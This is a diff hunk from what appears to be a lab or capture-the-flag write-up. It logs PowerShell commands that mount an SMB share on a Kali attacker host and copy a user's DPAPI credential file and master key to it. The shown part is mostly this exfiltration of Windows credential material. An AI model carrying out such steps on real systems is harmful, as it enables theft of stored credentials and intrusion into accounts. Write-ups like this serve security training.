@@ -806,6 +806,64 @@ Mode                 LastWriteTime         Length Name
 PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Credentials> 
 
 ```
+
+copying the file to kali:
+
+```
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Credentials> net use \\10.10.15.74\share /user:test test
+net use \\10.10.15.74\share /user:test test
+The command completed successfully.
+
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Credentials> copy 772275FAD58525253490A9B0039791D3 \\10.10.15.74\share\
+copy 772275FAD58525253490A9B0039791D3 \\10.10.15.74\share\
+
+```
+
+master key (?)
+
+```
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Protect> ls
+ls
+
+
+    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Protect
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d---s-         1/29/2025   7:13 AM                S-1-5-21-3927696377-1337352550-2781715495-1110                       
+
+
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Protect> cd Ccopy 772275FAD58525253490A9B0039791D3 \\10.10.15.74\share\
+cd Ccopy 772275FAD58525253490A9B0039791D3 \\10.10.15.74\share\
+Set-Location : A positional parameter cannot be found that accepts argument '772275FAD58525253490A9B0039791D3'.
+At line:1 char:1
++ cd Ccopy 772275FAD58525253490A9B0039791D3 \\10.10.15.74\share\
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [Set-Location], ParameterBindingException
+    + FullyQualifiedErrorId : PositionalParameterNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
+ 
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Protect> cd S-1-5-21-3927696377-1337352550-2781715495-1110
+cd S-1-5-21-3927696377-1337352550-2781715495-1110
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110> ls
+ls
+
+
+    Directory: C:\IT\Second-Line Support\Archived 
+    Users\todd.wolfe\appdata\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         1/29/2025   4:53 AM            740 08949382-134f-4c63-b93c-ce52efc0aa88                                 
+
+```
+
+```
+PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\appdata\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110> copy 08949382-134f-4c63-b93c-ce52efc0aa88 \\10.10.15.74\share
+copy 08949382-134f-4c63-b93c-ce52efc0aa88 \\10.10.15.74\share
+
+```
 ---
 ## Privilege Escalation
 
